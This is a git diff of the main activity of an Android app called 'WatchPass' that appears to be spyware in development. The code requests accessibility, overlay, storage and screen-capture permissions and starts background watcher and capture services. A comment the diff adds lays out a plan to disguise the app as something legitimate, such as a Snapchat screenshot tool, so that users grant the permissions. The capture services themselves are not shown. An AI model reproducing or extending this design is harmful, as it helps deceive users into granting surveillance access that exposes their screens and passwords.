@@ -2,16 +2,12 @@ package com.stevenbenack.watchpass;
 
 import android.Manifest;
 import android.content.Intent;
-import android.graphics.Bitmap;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Environment;
-import android.provider.MediaStore;
 import android.provider.Settings;
 import android.util.Log;
-import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 
@@ -19,20 +15,29 @@ import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.constraintlayout.widget.ConstraintLayout;
 
-import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
-
 import butterknife.BindView;
 import butterknife.ButterKnife;
 
+/**
+ * App activity - the only screen that the user would see. We could use this activity/page and others to create a
+ * legitimate looking app that does something - ideally some app that seems like it would actually use permissions.
+ * In theory, it would be fairly easy to modify this app to take screenshots in Snapchat, which would make a great
+ * justification for why this app needs multiple permissions from the user.
+ *
+ * In this case, this screen is just a testbench for me that asks for permissions and  on the app start, starts the
+ * background services I need to do everything.
+ */
 public class MainActivity extends AppCompatActivity {
     private static final String TAG = "MainActivity";
-    private static final int EXTERNAL_WRITE_PERMISSION_CODE = 1;
-    private static final int SYSTEM_ALERT_WINDOW_PERMISSION_CODE = 2;
-    private static final boolean ACCESSIBILITY_CHECK_OFF = false;       // turn off accessibility check prompt while testing
-    private static final int REQUEST_SCREENSHOT = 59706;
 
+    // Android permission request tags, allows identification of what request we are seeing in the log
+    private static final int BASE_PERMISSION_REQUEST = 4;
+    private static final int SYSTEM_ALERT_PERMISSION_REQUEST = 20;
+    private static final int ACCESSIBILITY_PERMISSION_REQUEST = 16;
+    private static final boolean DO_ACCESSIBILITY_CHECK = false;       // turn off accessibility check prompt while testing
+    private static final int SCREENSHOT_PERMISSION_REQUEST = 91;
+
+    // UI components of screen
     @BindView(R.id.password_field)
     EditText passwordField;
     @BindView(R.id.screenshot_button)
@@ -42,8 +47,8 @@ public class MainActivity extends AppCompatActivity {
     @BindView(R.id.floating_screen_button)
     Button floatingScreenButton;
 
-    private PermissionRequestHandler permissionRequestHandler = new PermissionRequestHandler();
-    private MediaProjectionManager mgr;
+    private PermissionRequestHandler permissionRequestHandler;
+    private MediaProjectionManager mediaProjectionManager;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -51,7 +56,8 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         ButterKnife.bind(this);
 
-        mgr = (MediaProjectionManager)getSystemService(MEDIA_PROJECTION_SERVICE);
+        permissionRequestHandler = new PermissionRequestHandler();
+        mediaProjectionManager = (MediaProjectionManager)getSystemService(MEDIA_PROJECTION_SERVICE);
     }
 
     @Override
@@ -59,13 +65,10 @@ public class MainActivity extends AppCompatActivity {
         super.onStart();
 
         requestPermissions();
+        requestAccessibilityPermissions();
+        getVirtualScreenCapturePermission();
 
-        File directory = new File(Environment.getExternalStorageDirectory() + "/Download/WatchPass/");
-        if ( !directory.exists() || !directory.isDirectory() ) {
-            directory.mkdirs();
-        }
-
-        screenshotButton.setOnClickListener(v -> takeScreenshot1());
+        screenshotButton.setOnClickListener(v -> getVirtualScreenCapturePermission());
         floatingScreenButton.setOnClickListener(v -> {
             Intent i = new Intent(getApplicationContext(), DrawScreenService.class);
             startService(i);
@@ -73,26 +76,25 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void requestPermissions() {
-        if ( !permissionRequestHandler.hasAccessibilityServicePermissions(this, WatcherService.class)
-                || ACCESSIBILITY_CHECK_OFF ) {
-            // ask user to allow permission
-            Log.d(TAG, "Does not have Watcher Accessibility Service Enabled");
-            showAccessibilityPermissionDialog();
-        }
-
         if ( !permissionRequestHandler.hasPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) ) {
             permissionRequestHandler.requestUnGrantedPermissions(this,
                     new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.SYSTEM_ALERT_WINDOW,
-                                    Manifest.permission.FOREGROUND_SERVICE},
-                    EXTERNAL_WRITE_PERMISSION_CODE);
+                                    Manifest.permission.FOREGROUND_SERVICE}, BASE_PERMISSION_REQUEST);
         }
 
-        if( Build.VERSION.SDK_INT >= 23) {
-            if (!Settings.canDrawOverlays(this)) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, SYSTEM_ALERT_WINDOW_PERMISSION_CODE);
+        if( Build.VERSION.SDK_INT >= 23 ) {
+            if ( !Settings.canDrawOverlays(this) ) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, SYSTEM_ALERT_PERMISSION_REQUEST);
             }
+        }
+    }
+
+    private void requestAccessibilityPermissions() {
+        if ( !permissionRequestHandler.hasAccessibilityServicePermissions(this, WatcherService.class) && DO_ACCESSIBILITY_CHECK ) {
+            // ask user to allow permission
+            Log.d(TAG, "Does not have Watcher Accessibility Service Enabled");
+            showAccessibilityPermissionDialog();
         }
     }
 
@@ -102,57 +104,28 @@ public class MainActivity extends AppCompatActivity {
         permissionDialog.setMessage(R.string.dialog_text);
         permissionDialog.setPositiveButton(R.string.dialog_affirmative_button_text, (dialog, which) -> {
             Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-//            Settings.ACTION_ACCESSIBILITY_SETTINGS  android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
-            startActivityForResult(intent, 0);
+            startActivityForResult(intent, ACCESSIBILITY_PERMISSION_REQUEST);
         });
         permissionDialog.setNegativeButton(R.string.dialog_cancel_button_text, (dialog, which) -> dialog.dismiss());
         permissionDialog.show();
     }
 
-    private void takeScreenshot1() {
-        startActivityForResult(mgr.createScreenCaptureIntent(), REQUEST_SCREENSHOT);
+    private void getVirtualScreenCapturePermission() {
+        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), SCREENSHOT_PERMISSION_REQUEST);
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if ( requestCode == REQUEST_SCREENSHOT ) {
+        if ( requestCode == SCREENSHOT_PERMISSION_REQUEST ) {
             if ( resultCode == RESULT_OK ) {
-                Intent i =
-                        new Intent(this, ScreenCaptureService.class)
-                                .putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
-                                .putExtra(ScreenCaptureService.EXTRA_RESULT_INTENT, data);
+                Intent i = new Intent(this, VirtualScreenCaptureService.class)
+                                .putExtra(VirtualScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
+                                .putExtra(VirtualScreenCaptureService.EXTRA_RESULT_INTENT, data);
 
                 startService(i);
             }
         }
         finish();
-    }
-
-
-    private void takeScreenshot() {
-        View v = rootLayout.getRootView();
-        v.setDrawingCacheEnabled(true);
-        Bitmap b = v.getDrawingCache();
-        File directory = new File(Environment.getExternalStorageDirectory() + "/Download/WatchPass/");
-        if ( !directory.exists() || !directory.isDirectory() ) {
-            directory.mkdirs();
-        }
-
-        File myPath = new File(directory, getString(R.string.screenshot_name) + ".jpg");
-        Log.d(TAG, "photo path: " + myPath);
-        FileOutputStream fos = null;
-
-        try {
-            fos = new FileOutputStream(myPath);
-            b.compress(Bitmap.CompressFormat.JPEG, 100, fos);
-            fos.flush();
-            fos.close();
-            MediaStore.Images.Media.insertImage(getContentResolver(), b, "Screen", "screen");
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
     }
 }
